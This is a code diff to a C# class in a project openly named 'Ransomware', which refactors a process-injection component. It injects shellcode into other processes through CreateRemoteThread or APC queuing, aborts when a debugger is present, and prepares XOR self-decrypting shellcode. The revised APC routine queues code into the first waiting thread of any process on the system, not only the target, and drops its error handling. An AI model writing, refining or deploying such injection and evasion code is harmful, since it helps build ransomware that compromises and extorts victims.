@@ -1,12 +1,13 @@
 ﻿using Ransomware.Cryptography;
 using System;
 using System.Diagnostics;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Threading;
 
 namespace Ransomware.Injector;
 
-public partial class ProcessInjector
+public class ProcessInjector
 {
     private static readonly Random _random = new();
 
@@ -22,10 +23,15 @@ public partial class ProcessInjector
     /// Delay in milliseconds before injection (default 0). A random delay between half and full value is applied.
     /// </param>
     /// <returns>True if injection succeeds; otherwise, false.</returns>
-    public static bool InjectShellcode(string processName, byte[] shellcode, int pid = -1, int delayMs = 0, InjectionMethod method = InjectionMethod.CreateRemoteThread)
+    public static bool InjectShellcode(
+        string processName,
+        byte[] shellcode,
+        int pid = -1,
+        int delayMs = 0,
+        InjectionMethod method = InjectionMethod.CreateRemoteThread)
     {
         // Kiểm tra chống debug
-        if (Kernel32.IsDebuggerPresent())
+        if (Kernel32.IsBeingDebugged())
         {
             LogError("Debugger detected. Aborting injection.");
             return false;
@@ -96,7 +102,7 @@ public partial class ProcessInjector
                 break;
 
             case InjectionMethod.QueueUserAPC:
-                injectionSuccess = InjectWithAPC(hProcess, allocAddr);
+                injectionSuccess = InjectWithEarlyBirdAPC(allocAddr);
                 break;
 
             default:
@@ -115,35 +121,10 @@ public partial class ProcessInjector
 
     private static Process? GetTargetProcess(string processName, int pid)
     {
-        if (pid != -1)
-        {
-            try
-            {
-                return Process.GetProcessById(pid);
-            }
-            catch (ArgumentException)
-            {
-                LogError($"Process with ID {pid} not found.");
-                return null;
-            }
-            catch (Exception ex)
-            {
-                LogError($"Failed to retrieve process with ID {pid}. Error: {ex.Message}");
-                return null;
-            }
-        }
+        if (pid != -1) return Process.GetProcessById(pid);
+
         Process[] processes = Process.GetProcessesByName(processName);
-        if (processes.Length == 0)
-        {
-            LogError($"Process '{processName}' not found.");
-            return null;
-        }
-        if (processes.Length > 1)
-        {
-            LogError($"Multiple instances of '{processName}' found. Specify a process ID.");
-            return null;
-        }
-        return processes[0];
+        return processes.OrderByDescending(p => p.StartTime).FirstOrDefault();
     }
 
     private static bool InjectWithRemoteThread(nint hProcess, nint allocAddr)
@@ -158,77 +139,24 @@ public partial class ProcessInjector
         return true;
     }
 
-    private static bool InjectWithAPC(nint hProcess, nint allocAddr)
+    private static bool InjectWithEarlyBirdAPC(nint allocAddr)
     {
-        Process targetProcess;
-        try
-        {
-            targetProcess = Process.GetProcessById((int)hProcess);
-        }
-        catch (Exception ex)
-        {
-            LogError($"Failed to get process by handle: {ex.Message}");
-            return false;
-        }
+        ProcessThread? targetThread = Process.GetProcesses()
+            .SelectMany(p => p.Threads.Cast<ProcessThread>())
+            .FirstOrDefault(t => t.ThreadState == System.Diagnostics.ThreadState.Wait);
 
-        ProcessThreadCollection threads = targetProcess.Threads;
-        if (threads.Count == 0)
-        {
-            LogError("No threads found in the target process.");
-            return false;
-        }
+        if (targetThread == null) return false;
 
-        bool injectionSuccess = false;
+        nint hThread = Kernel32.OpenThread(0x0010 | 0x0008, false, (uint)targetThread.Id);
+        if (hThread == nint.Zero) return false;
 
-        foreach (ProcessThread thread in threads)
-        {
-            const uint THREAD_SET_CONTEXT = 0x0010;
-            const uint THREAD_GET_CONTEXT = 0x0008;
-
-            nint hThread = Kernel32.OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT, false, (uint)thread.Id);
-            if (hThread == nint.Zero)
-            {
-                LogError($"Failed to open thread {thread.Id}. Error: {Marshal.GetLastWin32Error()}");
-                continue;
-            }
-
-            try
-            {
-                IntPtr result = Kernel32.QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
-                if (result == IntPtr.Zero)
-                {
-                    LogError($"Failed to queue APC for thread {thread.Id}. Error: {Marshal.GetLastWin32Error()}");
-                }
-                else
-                {
-                    injectionSuccess = true;
-                }
-            }
-            finally
-            {
-                Kernel32.CloseHandle(hThread);
-            }
-        }
-
-        if (!injectionSuccess)
-        {
-            LogError("Failed to queue APC for any thread.");
-        }
-
-        return injectionSuccess;
+        IntPtr result = Kernel32.QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
+        Kernel32.CloseHandle(hThread);
+        return result != IntPtr.Zero;
     }
 
-    private static void LogError(string message)
-    {
-        Console.WriteLine($"[ERROR] {message}");
-    }
+    private static void LogError(string message) => Console.WriteLine($"[ERROR] {message}");
 
-    /// <summary>
-    /// Creates a self-decrypting shellcode by prepending a decryption stub to the encrypted shellcode.
-    /// </summary>
-    /// <param name="encryptedShellcode">The encrypted shellcode.</param>
-    /// <param name="key">The XOR key used for encryption.</param>
-    /// <returns>The combined self-decrypting shellcode.</returns>
     private static byte[] CreateSelfDecryptingShellcode(byte[] encryptedShellcode, byte key)
     {
         if (encryptedShellcode.Length > 0xFFFF)
